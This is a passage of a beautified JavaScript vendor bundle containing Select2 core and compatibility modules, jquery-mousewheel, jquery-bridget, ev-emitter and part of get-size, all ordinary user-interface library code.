                    n._selectTriggered(t)
                }))
            }, t.prototype._selectTriggered = function (t, e) {
                var i = e.originalEvent;
                i && i.ctrlKey || this.trigger("close", {})
            }, t
        })), e.define("select2/i18n/en", [], (function () {
            return {
                errorLoading: function () {
                    return "The results could not be loaded."
                }, inputTooLong: function (t) {
                    var e = t.input.length - t.maximum, i = "Please delete " + e + " character";
                    return 1 != e && (i += "s"), i
                }, inputTooShort: function (t) {
                    return "Please enter " + (t.minimum - t.input.length) + " or more characters"
                }, loadingMore: function () {
                    return "Loading more results…"
                }, maximumSelected: function (t) {
                    var e = "You can only select " + t.maximum + " item";
                    return 1 != t.maximum && (e += "s"), e
                }, noResults: function () {
                    return "No results found"
                }, searching: function () {
                    return "Searching…"
                }
            }
        })), e.define("select2/defaults", ["jquery", "require", "./results", "./selection/single", "./selection/multiple", "./selection/placeholder", "./selection/allowClear", "./selection/search", "./selection/eventRelay", "./utils", "./translation", "./diacritics", "./data/select", "./data/array", "./data/ajax", "./data/tags", "./data/tokenizer", "./data/minimumInputLength", "./data/maximumInputLength", "./data/maximumSelectionLength", "./dropdown", "./dropdown/search", "./dropdown/hidePlaceholder", "./dropdown/infiniteScroll", "./dropdown/attachBody", "./dropdown/minimumResultsForSearch", "./dropdown/selectOnClose", "./dropdown/closeOnSelect", "./i18n/en"], (function (t, e, i, n, o, s, r, a, l, c, d, u, h, p, f, g, m, v, y, _, w, b, x, C, $, S, T, k, O) {
            function A() {
                this.reset()
            }

            return A.prototype.apply = function (u) {
                if (null == (u = t.extend(!0, {}, this.defaults, u)).dataAdapter) {
                    if (null != u.ajax ? u.dataAdapter = f : null != u.data ? u.dataAdapter = p : u.dataAdapter = h, u.minimumInputLength > 0 && (u.dataAdapter = c.Decorate(u.dataAdapter, v)), u.maximumInputLength > 0 && (u.dataAdapter = c.Decorate(u.dataAdapter, y)), u.maximumSelectionLength > 0 && (u.dataAdapter = c.Decorate(u.dataAdapter, _)), u.tags && (u.dataAdapter = c.Decorate(u.dataAdapter, g)), (null != u.tokenSeparators || null != u.tokenizer) && (u.dataAdapter = c.Decorate(u.dataAdapter, m)), null != u.query) {
                        var O = e(u.amdBase + "compat/query");
                        u.dataAdapter = c.Decorate(u.dataAdapter, O)
                    }
                    if (null != u.initSelection) {
                        var A = e(u.amdBase + "compat/initSelection");
                        u.dataAdapter = c.Decorate(u.dataAdapter, A)
                    }
                }
                if (null == u.resultsAdapter && (u.resultsAdapter = i, null != u.ajax && (u.resultsAdapter = c.Decorate(u.resultsAdapter, C)), null != u.placeholder && (u.resultsAdapter = c.Decorate(u.resultsAdapter, x)), u.selectOnClose && (u.resultsAdapter = c.Decorate(u.resultsAdapter, T))), null == u.dropdownAdapter) {
                    if (u.multiple) u.dropdownAdapter = w; else {
                        var E = c.Decorate(w, b);
                        u.dropdownAdapter = E
                    }
                    if (0 !== u.minimumResultsForSearch && (u.dropdownAdapter = c.Decorate(u.dropdownAdapter, S)), u.closeOnSelect && (u.dropdownAdapter = c.Decorate(u.dropdownAdapter, k)), null != u.dropdownCssClass || null != u.dropdownCss || null != u.adaptDropdownCssClass) {
                        var z = e(u.amdBase + "compat/dropdownCss");
                        u.dropdownAdapter = c.Decorate(u.dropdownAdapter, z)
                    }
                    u.dropdownAdapter = c.Decorate(u.dropdownAdapter, $)
                }
                if (null == u.selectionAdapter) {
                    if (u.multiple ? u.selectionAdapter = o : u.selectionAdapter = n, null != u.placeholder && (u.selectionAdapter = c.Decorate(u.selectionAdapter, s)), u.allowClear && (u.selectionAdapter = c.Decorate(u.selectionAdapter, r)), u.multiple && (u.selectionAdapter = c.Decorate(u.selectionAdapter, a)), null != u.containerCssClass || null != u.containerCss || null != u.adaptContainerCssClass) {
                        var I = e(u.amdBase + "compat/containerCss");
                        u.selectionAdapter = c.Decorate(u.selectionAdapter, I)
                    }
                    u.selectionAdapter = c.Decorate(u.selectionAdapter, l)
                }
                if ("string" == typeof u.language) if (u.language.indexOf("-") > 0) {
                    var D = u.language.split("-")[0];
                    u.language = [u.language, D]
                } else u.language = [u.language];
                if (t.isArray(u.language)) {
                    var P = new d;
                    u.language.push("en");
                    for (var L = u.language, M = 0; M < L.length; M++) {
                        var q = L[M], B = {};
                        try {
                            B = d.loadPath(q)
                        } catch (t) {
                            try {
                                q = this.defaults.amdLanguageBase + q, B = d.loadPath(q)
                            } catch (t) {
                                u.debug && window.console && console.warn && console.warn('Select2: The language file for "' + q + '" could not be automatically loaded. A fallback will be used instead.');
                                continue
                            }
                        }
                        P.extend(B)
                    }
                    u.translations = P
                } else {
                    var j = d.loadPath(this.defaults.amdLanguageBase + "en"), R = new d(u.language);
                    R.extend(j), u.translations = R
                }
                return u
            }, A.prototype.reset = function () {
                function e(t) {
                    return t.replace(/[^\u0000-\u007E]/g, (function (t) {
                        return u[t] || t
                    }))
                }

                this.defaults = {
                    amdBase: "./",
                    amdLanguageBase: "./i18n/",
                    closeOnSelect: !0,
                    debug: !1,
                    dropdownAutoWidth: !1,
                    escapeMarkup: c.escapeMarkup,
                    language: O,
                    matcher: function i(n, o) {
                        if ("" === t.trim(n.term)) return o;
                        if (o.children && o.children.length > 0) {
                            for (var s = t.extend(!0, {}, o), r = o.children.length - 1; r >= 0; r--) {
                                null == i(n, o.children[r]) && s.children.splice(r, 1)
                            }
                            return s.children.length > 0 ? s : i(n, s)
                        }
                        var a = e(o.text).toUpperCase(), l = e(n.term).toUpperCase();
                        return a.indexOf(l) > -1 ? o : null
                    },
                    minimumInputLength: 0,
                    maximumInputLength: 0,
                    maximumSelectionLength: 0,
                    minimumResultsForSearch: 0,
                    selectOnClose: !1,
                    sorter: function (t) {
                        return t
                    },
                    templateResult: function (t) {
                        return t.text
                    },
                    templateSelection: function (t) {
                        return t.text
                    },
                    theme: "default",
                    width: "resolve"
                }
            }, A.prototype.set = function (e, i) {
                var n = {};
                n[t.camelCase(e)] = i;
                var o = c._convertData(n);
                t.extend(this.defaults, o)
            }, new A
        })), e.define("select2/options", ["require", "jquery", "./defaults", "./utils"], (function (t, e, i, n) {
            function o(e, o) {
                if (this.options = e, null != o && this.fromElement(o), this.options = i.apply(this.options), o && o.is("input")) {
                    var s = t(this.get("amdBase") + "compat/inputData");
                    this.options.dataAdapter = n.Decorate(this.options.dataAdapter, s)
                }
            }

            return o.prototype.fromElement = function (t) {
                var i = ["select2"];
                null == this.options.multiple && (this.options.multiple = t.prop("multiple")), null == this.options.disabled && (this.options.disabled = t.prop("disabled")), null == this.options.language && (t.prop("lang") ? this.options.language = t.prop("lang").toLowerCase() : t.closest("[lang]").prop("lang") && (this.options.language = t.closest("[lang]").prop("lang"))), null == this.options.dir && (t.prop("dir") ? this.options.dir = t.prop("dir") : t.closest("[dir]").prop("dir") ? this.options.dir = t.closest("[dir]").prop("dir") : this.options.dir = "ltr"), t.prop("disabled", this.options.disabled), t.prop("multiple", this.options.multiple), t.data("select2Tags") && (this.options.debug && window.console && console.warn && console.warn('Select2: The `data-select2-tags` attribute has been changed to use the `data-data` and `data-tags="true"` attributes and will be removed in future versions of Select2.'), t.data("data", t.data("select2Tags")), t.data("tags", !0)), t.data("ajaxUrl") && (this.options.debug && window.console && console.warn && console.warn("Select2: The `data-ajax-url` attribute has been changed to `data-ajax--url` and support for the old attribute will be removed in future versions of Select2."), t.attr("ajax--url", t.data("ajaxUrl")), t.data("ajax--url", t.data("ajaxUrl")));
                var o;
                o = e.fn.jquery && "1." == e.fn.jquery.substr(0, 2) && t[0].dataset ? e.extend(!0, {}, t[0].dataset, t.data()) : t.data();
                var s = e.extend(!0, {}, o);
                for (var r in s = n._convertData(s)) e.inArray(r, i) > -1 || (e.isPlainObject(this.options[r]) ? e.extend(this.options[r], s[r]) : this.options[r] = s[r]);
                return this
            }, o.prototype.get = function (t) {
                return this.options[t]
            }, o.prototype.set = function (t, e) {
                this.options[t] = e
            }, o
        })), e.define("select2/core", ["jquery", "./options", "./utils", "./keys"], (function (t, e, i, n) {
            var o = function (t, i) {
                null != t.data("select2") && t.data("select2").destroy(), this.$element = t, this.id = this._generateId(t), i = i || {}, this.options = new e(i, t), o.__super__.constructor.call(this);
                var n = t.attr("tabindex") || 0;
                t.data("old-tabindex", n), t.attr("tabindex", "-1");
                var s = this.options.get("dataAdapter");
                this.dataAdapter = new s(t, this.options);
                var r = this.render();
                this._placeContainer(r);
                var a = this.options.get("selectionAdapter");
                this.selection = new a(t, this.options), this.$selection = this.selection.render(), this.selection.position(this.$selection, r);
                var l = this.options.get("dropdownAdapter");
                this.dropdown = new l(t, this.options), this.$dropdown = this.dropdown.render(), this.dropdown.position(this.$dropdown, r);
                var c = this.options.get("resultsAdapter");
                this.results = new c(t, this.options, this.dataAdapter), this.$results = this.results.render(), this.results.position(this.$results, this.$dropdown);
                var d = this;
                this._bindAdapters(), this._registerDomEvents(), this._registerDataEvents(), this._registerSelectionEvents(), this._registerDropdownEvents(), this._registerResultsEvents(), this._registerEvents(), this.dataAdapter.current((function (t) {
                    d.trigger("selection:update", {data: t})
                })), t.addClass("select2-hidden-accessible"), t.attr("aria-hidden", "true"), this._syncAttributes(), t.data("select2", this)
            };
            return i.Extend(o, i.Observable), o.prototype._generateId = function (t) {
                return "select2-" + (null != t.attr("id") ? t.attr("id") : null != t.attr("name") ? t.attr("name") + "-" + i.generateChars(2) : i.generateChars(4)).replace(/(:|\.|\[|\]|,)/g, "")
            }, o.prototype._placeContainer = function (t) {
                t.insertAfter(this.$element);
                var e = this._resolveWidth(this.$element, this.options.get("width"));
                null != e && t.css("width", e)
            }, o.prototype._resolveWidth = function (t, e) {
                var i = /^width:(([-+]?([0-9]*\.)?[0-9]+)(px|em|ex|%|in|cm|mm|pt|pc))/i;
                if ("resolve" == e) {
                    var n = this._resolveWidth(t, "style");
                    return null != n ? n : this._resolveWidth(t, "element")
                }
                if ("element" == e) {
                    var o = t.outerWidth(!1);
                    return 0 >= o ? "auto" : o + "px"
                }
                if ("style" == e) {
                    var s = t.attr("style");
                    if ("string" != typeof s) return null;
                    for (var r = s.split(";"), a = 0, l = r.length; l > a; a += 1) {
                        var c = r[a].replace(/\s/g, "").match(i);
                        if (null !== c && c.length >= 1) return c[1]
                    }
                    return null
                }
                return e
            }, o.prototype._bindAdapters = function () {
                this.dataAdapter.bind(this, this.$container), this.selection.bind(this, this.$container), this.dropdown.bind(this, this.$container), this.results.bind(this, this.$container)
            }, o.prototype._registerDomEvents = function () {
                var e = this;
                this.$element.on("change.select2", (function () {
                    e.dataAdapter.current((function (t) {
                        e.trigger("selection:update", {data: t})
                    }))
                })), this._sync = i.bind(this._syncAttributes, this), this.$element[0].attachEvent && this.$element[0].attachEvent("onpropertychange", this._sync);
                var n = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;
                null != n ? (this._observer = new n((function (i) {
                    t.each(i, e._sync)
                })), this._observer.observe(this.$element[0], {
                    attributes: !0,
                    subtree: !1
                })) : this.$element[0].addEventListener && this.$element[0].addEventListener("DOMAttrModified", e._sync, !1)
            }, o.prototype._registerDataEvents = function () {
                var t = this;
                this.dataAdapter.on("*", (function (e, i) {
                    t.trigger(e, i)
                }))
            }, o.prototype._registerSelectionEvents = function () {
                var e = this, i = ["toggle", "focus"];
                this.selection.on("toggle", (function () {
                    e.toggleDropdown()
                })), this.selection.on("focus", (function (t) {
                    e.focus(t)
                })), this.selection.on("*", (function (n, o) {
                    -1 === t.inArray(n, i) && e.trigger(n, o)
                }))
            }, o.prototype._registerDropdownEvents = function () {
                var t = this;
                this.dropdown.on("*", (function (e, i) {
                    t.trigger(e, i)
                }))
            }, o.prototype._registerResultsEvents = function () {
                var t = this;
                this.results.on("*", (function (e, i) {
                    t.trigger(e, i)
                }))
            }, o.prototype._registerEvents = function () {
                var t = this;
                this.on("open", (function () {
                    t.$container.addClass("select2-container--open")
                })), this.on("close", (function () {
                    t.$container.removeClass("select2-container--open")
                })), this.on("enable", (function () {
                    t.$container.removeClass("select2-container--disabled")
                })), this.on("disable", (function () {
                    t.$container.addClass("select2-container--disabled")
                })), this.on("blur", (function () {
                    t.$container.removeClass("select2-container--focus")
                })), this.on("query", (function (e) {
                    t.isOpen() || t.trigger("open", {}), this.dataAdapter.query(e, (function (i) {
                        t.trigger("results:all", {data: i, query: e})
                    }))
                })), this.on("query:append", (function (e) {
                    this.dataAdapter.query(e, (function (i) {
                        t.trigger("results:append", {data: i, query: e})
                    }))
                })), this.on("keypress", (function (e) {
                    var i = e.which;
                    t.isOpen() ? i === n.ESC || i === n.TAB || i === n.UP && e.altKey ? (t.close(), e.preventDefault()) : i === n.ENTER ? (t.trigger("results:select", {}), e.preventDefault()) : i === n.SPACE && e.ctrlKey ? (t.trigger("results:toggle", {}), e.preventDefault()) : i === n.UP ? (t.trigger("results:previous", {}), e.preventDefault()) : i === n.DOWN && (t.trigger("results:next", {}), e.preventDefault()) : (i === n.ENTER || i === n.SPACE || i === n.DOWN && e.altKey) && (t.open(), e.preventDefault())
                }))
            }, o.prototype._syncAttributes = function () {
                this.options.set("disabled", this.$element.prop("disabled")), this.options.get("disabled") ? (this.isOpen() && this.close(), this.trigger("disable", {})) : this.trigger("enable", {})
            }, o.prototype.trigger = function (t, e) {
                var i = o.__super__.trigger,
                    n = {open: "opening", close: "closing", select: "selecting", unselect: "unselecting"};
                if (void 0 === e && (e = {}), t in n) {
                    var s = n[t], r = {prevented: !1, name: t, args: e};
                    if (i.call(this, s, r), r.prevented) return void (e.prevented = !0)
                }
                i.call(this, t, e)
            }, o.prototype.toggleDropdown = function () {
                this.options.get("disabled") || (this.isOpen() ? this.close() : this.open())
            }, o.prototype.open = function () {
                this.isOpen() || this.trigger("query", {})
            }, o.prototype.close = function () {
                this.isOpen() && this.trigger("close", {})
            }, o.prototype.isOpen = function () {
                return this.$container.hasClass("select2-container--open")
            }, o.prototype.hasFocus = function () {
                return this.$container.hasClass("select2-container--focus")
            }, o.prototype.focus = function (t) {
                this.hasFocus() || (this.$container.addClass("select2-container--focus"), this.trigger("focus", {}))
            }, o.prototype.enable = function (t) {
                this.options.get("debug") && window.console && console.warn && console.warn('Select2: The `select2("enable")` method has been deprecated and will be removed in later Select2 versions. Use $element.prop("disabled") instead.'), (null == t || 0 === t.length) && (t = [!0]);
                var e = !t[0];
                this.$element.prop("disabled", e)
            }, o.prototype.data = function () {
                this.options.get("debug") && arguments.length > 0 && window.console && console.warn && console.warn('Select2: Data can no longer be set using `select2("data")`. You should consider setting the value instead using `$element.val()`.');
                var t = [];
                return this.dataAdapter.current((function (e) {
                    t = e
                })), t
            }, o.prototype.val = function (e) {
                if (this.options.get("debug") && window.console && console.warn && console.warn('Select2: The `select2("val")` method has been deprecated and will be removed in later Select2 versions. Use $element.val() instead.'), null == e || 0 === e.length) return this.$element.val();
                var i = e[0];
                t.isArray(i) && (i = t.map(i, (function (t) {
                    return t.toString()
                }))), this.$element.val(i).trigger("change")
            }, o.prototype.destroy = function () {
                this.$container.remove(), this.$element[0].detachEvent && this.$element[0].detachEvent("onpropertychange", this._sync), null != this._observer ? (this._observer.disconnect(), this._observer = null) : this.$element[0].removeEventListener && this.$element[0].removeEventListener("DOMAttrModified", this._sync, !1), this._sync = null, this.$element.off(".select2"), this.$element.attr("tabindex", this.$element.data("old-tabindex")), this.$element.removeClass("select2-hidden-accessible"), this.$element.attr("aria-hidden", "false"), this.$element.removeData("select2"), this.dataAdapter.destroy(), this.selection.destroy(), this.dropdown.destroy(), this.results.destroy(), this.dataAdapter = null, this.selection = null, this.dropdown = null, this.results = null
            }, o.prototype.render = function () {
                var e = t('<span class="select2 select2-container"><span class="selection"></span><span class="dropdown-wrapper" aria-hidden="true"></span></span>');
                return e.attr("dir", this.options.get("dir")), this.$container = e, this.$container.addClass("select2-container--" + this.options.get("theme")), e.data("element", this.$element), e
            }, o
        })), e.define("select2/compat/utils", ["jquery"], (function (t) {
            return {
                syncCssClasses: function (e, i, n) {
                    var o, s, r = [];
                    (o = t.trim(e.attr("class"))) && t((o = "" + o).split(/\s+/)).each((function () {
                        0 === this.indexOf("select2-") && r.push(this)
                    })), (o = t.trim(i.attr("class"))) && t((o = "" + o).split(/\s+/)).each((function () {
                        0 !== this.indexOf("select2-") && (null != (s = n(this)) && r.push(s))
                    })), e.attr("class", r.join(" "))
                }
            }
        })), e.define("select2/compat/containerCss", ["jquery", "./utils"], (function (t, e) {
            function i(t) {
                return null
            }

            function n() {
            }

            return n.prototype.render = function (n) {
                var o = n.call(this), s = this.options.get("containerCssClass") || "";
                t.isFunction(s) && (s = s(this.$element));
                var r = this.options.get("adaptContainerCssClass");
                if (r = r || i, -1 !== s.indexOf(":all:")) {
                    s = s.replace(":all:", "");
                    var a = r;
                    r = function (t) {
                        var e = a(t);
                        return null != e ? e + " " + t : t
                    }
                }
                var l = this.options.get("containerCss") || {};
                return t.isFunction(l) && (l = l(this.$element)), e.syncCssClasses(o, this.$element, r), o.css(l), o.addClass(s), o
            }, n
        })), e.define("select2/compat/dropdownCss", ["jquery", "./utils"], (function (t, e) {
            function i(t) {
                return null
            }

            function n() {
            }

            return n.prototype.render = function (n) {
                var o = n.call(this), s = this.options.get("dropdownCssClass") || "";
                t.isFunction(s) && (s = s(this.$element));
                var r = this.options.get("adaptDropdownCssClass");
                if (r = r || i, -1 !== s.indexOf(":all:")) {
                    s = s.replace(":all:", "");
                    var a = r;
                    r = function (t) {
                        var e = a(t);
                        return null != e ? e + " " + t : t
                    }
                }
                var l = this.options.get("dropdownCss") || {};
                return t.isFunction(l) && (l = l(this.$element)), e.syncCssClasses(o, this.$element, r), o.css(l), o.addClass(s), o
            }, n
        })), e.define("select2/compat/initSelection", ["jquery"], (function (t) {
            function e(t, e, i) {
                i.get("debug") && window.console && console.warn && console.warn("Select2: The `initSelection` option has been deprecated in favor of a custom data adapter that overrides the `current` method. This method is now called multiple times instead of a single time when the instance is initialized. Support will be removed for the `initSelection` option in future versions of Select2"), this.initSelection = i.get("initSelection"), this._isInitialized = !1, t.call(this, e, i)
            }

            return e.prototype.current = function (e, i) {
                var n = this;
                return this._isInitialized ? void e.call(this, i) : void this.initSelection.call(null, this.$element, (function (e) {
                    n._isInitialized = !0, t.isArray(e) || (e = [e]), i(e)
                }))
            }, e
        })), e.define("select2/compat/inputData", ["jquery"], (function (t) {
            function e(t, e, i) {
                this._currentData = [], this._valueSeparator = i.get("valueSeparator") || ",", "hidden" === e.prop("type") && i.get("debug") && console && console.warn && console.warn("Select2: Using a hidden input with Select2 is no longer supported and may stop working in the future. It is recommended to use a `<select>` element instead."), t.call(this, e, i)
            }

            return e.prototype.current = function (e, i) {
                function n(e, i) {
                    var o = [];
                    return e.selected || -1 !== t.inArray(e.id, i) ? (e.selected = !0, o.push(e)) : e.selected = !1, e.children && o.push.apply(o, n(e.children, i)), o
                }

                for (var o = [], s = 0; s < this._currentData.length; s++) {
                    var r = this._currentData[s];
                    o.push.apply(o, n(r, this.$element.val().split(this._valueSeparator)))
                }
                i(o)
            }, e.prototype.select = function (e, i) {
                if (this.options.get("multiple")) {
                    var n = this.$element.val();
                    n += this._valueSeparator + i.id, this.$element.val(n), this.$element.trigger("change")
                } else this.current((function (e) {
                    t.map(e, (function (t) {
                        t.selected = !1
                    }))
                })), this.$element.val(i.id), this.$element.trigger("change")
            }, e.prototype.unselect = function (t, e) {
                var i = this;
                e.selected = !1, this.current((function (t) {
                    for (var n = [], o = 0; o < t.length; o++) {
                        var s = t[o];
                        e.id != s.id && n.push(s.id)
                    }
                    i.$element.val(n.join(i._valueSeparator)), i.$element.trigger("change")
                }))
            }, e.prototype.query = function (t, e, i) {
                for (var n = [], o = 0; o < this._currentData.length; o++) {
                    var s = this._currentData[o], r = this.matches(e, s);
                    null !== r && n.push(r)
                }
                i({results: n})
            }, e.prototype.addOptions = function (e, i) {
                var n = t.map(i, (function (e) {
                    return t.data(e[0], "data")
                }));
                this._currentData.push.apply(this._currentData, n)
            }, e
        })), e.define("select2/compat/matcher", ["jquery"], (function (t) {
            return function (e) {
                return function (i, n) {
                    var o = t.extend(!0, {}, n);
                    if (null == i.term || "" === t.trim(i.term)) return o;
                    if (n.children) {
                        for (var s = n.children.length - 1; s >= 0; s--) {
                            var r = n.children[s];
                            e(i.term, r.text, r) || o.children.splice(s, 1)
                        }
                        if (o.children.length > 0) return o
                    }
                    return e(i.term, n.text, n) ? o : null
                }
            }
        })), e.define("select2/compat/query", [], (function () {
            function t(t, e, i) {
                i.get("debug") && window.console && console.warn && console.warn("Select2: The `query` option has been deprecated in favor of a custom data adapter that overrides the `query` method. Support will be removed for the `query` option in future versions of Select2."), t.call(this, e, i)
            }

            return t.prototype.query = function (t, e, i) {
                e.callback = i, this.options.get("query").call(null, e)
            }, t
        })), e.define("select2/dropdown/attachContainer", [], (function () {
            function t(t, e, i) {
                t.call(this, e, i)
            }

            return t.prototype.position = function (t, e, i) {
                i.find(".dropdown-wrapper").append(e), e.addClass("select2-dropdown--below"), i.addClass("select2-container--below")
            }, t
        })), e.define("select2/dropdown/stopPropagation", [], (function () {
            function t() {
            }

            return t.prototype.bind = function (t, e, i) {
                t.call(this, e, i);
                this.$dropdown.on(["blur", "change", "click", "dblclick", "focus", "focusin", "focusout", "input", "keydown", "keyup", "keypress", "mousedown", "mouseenter", "mouseleave", "mousemove", "mouseover", "mouseup", "search", "touchend", "touchstart"].join(" "), (function (t) {
                    t.stopPropagation()
                }))
            }, t
        })), e.define("select2/selection/stopPropagation", [], (function () {
            function t() {
            }

            return t.prototype.bind = function (t, e, i) {
                t.call(this, e, i);
                this.$selection.on(["blur", "change", "click", "dblclick", "focus", "focusin", "focusout", "input", "keydown", "keyup", "keypress", "mousedown", "mouseenter", "mouseleave", "mousemove", "mouseover", "mouseup", "search", "touchend", "touchstart"].join(" "), (function (t) {
                    t.stopPropagation()
                }))
            }, t
        })), function (i) {
            "function" == typeof e.define && e.define.amd ? e.define("jquery-mousewheel", ["jquery"], i) : "object" == typeof exports ? module.exports = i : i(t)
        }((function (t) {
            function e(e) {
                var r = e || window.event, a = l.call(arguments, 1), c = 0, u = 0, h = 0, p = 0, f = 0, g = 0;
                if ((e = t.event.fix(r)).type = "mousewheel", "detail" in r && (h = -1 * r.detail), "wheelDelta" in r && (h = r.wheelDelta), "wheelDeltaY" in r && (h = r.wheelDeltaY), "wheelDeltaX" in r && (u = -1 * r.wheelDeltaX), "axis" in r && r.axis === r.HORIZONTAL_AXIS && (u = -1 * h, h = 0), c = 0 === h ? u : h, "deltaY" in r && (c = h = -1 * r.deltaY), "deltaX" in r && (u = r.deltaX, 0 === h && (c = -1 * u)), 0 !== h || 0 !== u) {
                    if (1 === r.deltaMode) {
                        var m = t.data(this, "mousewheel-line-height");
                        c *= m, h *= m, u *= m
                    } else if (2 === r.deltaMode) {
                        var v = t.data(this, "mousewheel-page-height");
                        c *= v, h *= v, u *= v
                    }
                    if (p = Math.max(Math.abs(h), Math.abs(u)), (!s || s > p) && (s = p, n(r, p) && (s /= 40)), n(r, p) && (c /= 40, u /= 40, h /= 40), c = Math[c >= 1 ? "floor" : "ceil"](c / s), u = Math[u >= 1 ? "floor" : "ceil"](u / s), h = Math[h >= 1 ? "floor" : "ceil"](h / s), d.settings.normalizeOffset && this.getBoundingClientRect) {
                        var y = this.getBoundingClientRect();
                        f = e.clientX - y.left, g = e.clientY - y.top
                    }
                    return e.deltaX = u, e.deltaY = h, e.deltaFactor = s, e.offsetX = f, e.offsetY = g, e.deltaMode = 0, a.unshift(e, c, u, h), o && clearTimeout(o), o = setTimeout(i, 200), (t.event.dispatch || t.event.handle).apply(this, a)
                }
            }

            function i() {
                s = null
            }

            function n(t, e) {
                return d.settings.adjustOldDeltas && "mousewheel" === t.type && e % 120 == 0
            }

            var o, s, r = ["wheel", "mousewheel", "DOMMouseScroll", "MozMousePixelScroll"],
                a = "onwheel" in document || document.documentMode >= 9 ? ["wheel"] : ["mousewheel", "DomMouseScroll", "MozMousePixelScroll"],
                l = Array.prototype.slice;
            if (t.event.fixHooks) for (var c = r.length; c;) t.event.fixHooks[r[--c]] = t.event.mouseHooks;
            var d = t.event.special.mousewheel = {
                version: "3.1.12", setup: function () {
                    if (this.addEventListener) for (var i = a.length; i;) this.addEventListener(a[--i], e, !1); else this.onmousewheel = e;
                    t.data(this, "mousewheel-line-height", d.getLineHeight(this)), t.data(this, "mousewheel-page-height", d.getPageHeight(this))
                }, teardown: function () {
                    if (this.removeEventListener) for (var i = a.length; i;) this.removeEventListener(a[--i], e, !1); else this.onmousewheel = null;
                    t.removeData(this, "mousewheel-line-height"), t.removeData(this, "mousewheel-page-height")
                }, getLineHeight: function (e) {
                    var i = t(e), n = i["offsetParent" in t.fn ? "offsetParent" : "parent"]();
                    return n.length || (n = t("body")), parseInt(n.css("fontSize"), 10) || parseInt(i.css("fontSize"), 10) || 16
                }, getPageHeight: function (e) {
                    return t(e).height()
                }, settings: {adjustOldDeltas: !0, normalizeOffset: !0}
            };
            t.fn.extend({
                mousewheel: function (t) {
                    return t ? this.bind("mousewheel", t) : this.trigger("mousewheel")
                }, unmousewheel: function (t) {
                    return this.unbind("mousewheel", t)
                }
            })
        })), e.define("jquery.select2", ["jquery", "jquery-mousewheel", "./select2/core", "./select2/defaults"], (function (t, e, i, n) {
            if (null == t.fn.select2) {
                var o = ["open", "close", "destroy"];
                t.fn.select2 = function (e) {
                    if ("object" == typeof (e = e || {})) return this.each((function () {
                        var n = t.extend(!0, {}, e);
                        new i(t(this), n)
                    })), this;
                    var n;
                    if ("string" == typeof e) return this.each((function () {
                        var i = t(this).data("select2");
                        null == i && window.console && console.error && console.error("The select2('" + e + "') method was called on an element that is not using Select2.");
                        var o = Array.prototype.slice.call(arguments, 1);
                        n = i[e].apply(i, o)
                    })), t.inArray(e, o) > -1 ? this : n;
                    throw new Error("Invalid arguments for Select2: " + e)
                }
            }
            return null == t.fn.select2.defaults && (t.fn.select2.defaults = n), i
        })), {define: e.define, require: e.require}
    }(), i = e.require("jquery.select2");
    return t.fn.select2.amd = e, i
})), function (t, e) {
    "use strict";
    "function" == typeof define && define.amd ? define("jquery-bridget/jquery-bridget", ["jquery"], (function (i) {
        e(t, i)
    })) : "object" == typeof module && module.exports ? module.exports = e(t, require("jquery")) : t.jQueryBridget = e(t, t.jQuery)
}(window, (function (t, e) {
    "use strict";

    function i(i, s, a) {
        function l(t, e, n) {
            var o, s = "$()." + i + '("' + e + '")';
            return t.each((function (t, l) {
                var c = a.data(l, i);
                if (c) {
                    var d = c[e];
                    if (d && "_" != e.charAt(0)) {
                        var u = d.apply(c, n);
                        o = void 0 === o ? u : o
                    } else r(s + " is not a valid method")
                } else r(i + " not initialized. Cannot call methods, i.e. " + s)
            })), void 0 !== o ? o : t
        }

        function c(t, e) {
            t.each((function (t, n) {
                var o = a.data(n, i);
                o ? (o.option(e), o._init()) : (o = new s(n, e), a.data(n, i, o))
            }))
        }

        (a = a || e || t.jQuery) && (s.prototype.option || (s.prototype.option = function (t) {
            a.isPlainObject(t) && (this.options = a.extend(!0, this.options, t))
        }), a.fn[i] = function (t) {
            if ("string" == typeof t) {
                var e = o.call(arguments, 1);
                return l(this, t, e)
            }
            return c(this, t), this
        }, n(a))
    }

    function n(t) {
        !t || t && t.bridget || (t.bridget = i)
    }

    var o = Array.prototype.slice, s = t.console, r = void 0 === s ? function () {
    } : function (t) {
        s.error(t)
    };
    return n(e || t.jQuery), i
})), function (t, e) {
    "function" == typeof define && define.amd ? define("ev-emitter/ev-emitter", e) : "object" == typeof module && module.exports ? module.exports = e() : t.EvEmitter = e()
}(this, (function () {
    function t() {
    }

    var e = t.prototype;
    return e.on = function (t, e) {
        if (t && e) {
            var i = this._events = this._events || {}, n = i[t] = i[t] || [];
            return -1 == n.indexOf(e) && n.push(e), this
        }
    }, e.once = function (t, e) {
        if (t && e) {
            this.on(t, e);
            var i = this._onceEvents = this._onceEvents || {};
            return (i[t] = i[t] || [])[e] = !0, this
        }
    }, e.off = function (t, e) {
        var i = this._events && this._events[t];
        if (i && i.length) {
            var n = i.indexOf(e);
            return -1 != n && i.splice(n, 1), this
        }
    }, e.emitEvent = function (t, e) {
        var i = this._events && this._events[t];
        if (i && i.length) {
            var n = 0, o = i[n];
            e = e || [];
            for (var s = this._onceEvents && this._onceEvents[t]; o;) {
                var r = s && s[o];
                r && (this.off(t, o), delete s[o]), o.apply(this, e), o = i[n += r ? 0 : 1]
            }
            return this
        }
    }, t
})), function (t, e) {
    "use strict";
    "function" == typeof define && define.amd ? define("get-size/get-size", [], (function () {
        return e()
    })) : "object" == typeof module && module.exports ? module.exports = e() : t.getSize = e()
}(window, (function () {
    "use strict";

    function t(t) {
        var e = parseFloat(t);
        return -1 == t.indexOf("%") && !isNaN(e) && e
    }

    function e(t) {
        var e = getComputedStyle(t);
        return e || s("Style returned " + e + ". Are you running this code in a hidden iframe on Firefox? See http://bit.ly/getsizebug1"), e
    }

    function i() {
        if (!l) {
            l = !0;
            var i = document.createElement("div");
            i.style.width = "200px", i.style.padding = "1px 2px 3px 4px", i.style.borderStyle = "solid", i.style.borderWidth = "1px 2px 3px 4px", i.style.boxSizing = "border-box";
            var s = document.body || document.documentElement;
            s.appendChild(i);
            var r = e(i);
            n.isBoxSizeOuter = o = 200 == t(r.width), s.removeChild(i)
        }
    }

    function n(n) {
        if (i(), "string" == typeof n && (n = document.querySelector(n)), n && "object" == typeof n && n.nodeType) {
            var s = e(n);
            if ("none" == s.display) return function () {
                for (var t = {
                    width: 0,
                    height: 0,
                    innerWidth: 0,
                    innerHeight: 0,
                    outerWidth: 0,
                    outerHeight: 0
                }, e = 0; a > e; e++) t[r[e]] = 0;
                return t
            }();
            var l = {};
            l.width = n.offsetWidth, l.height = n.offsetHeight;
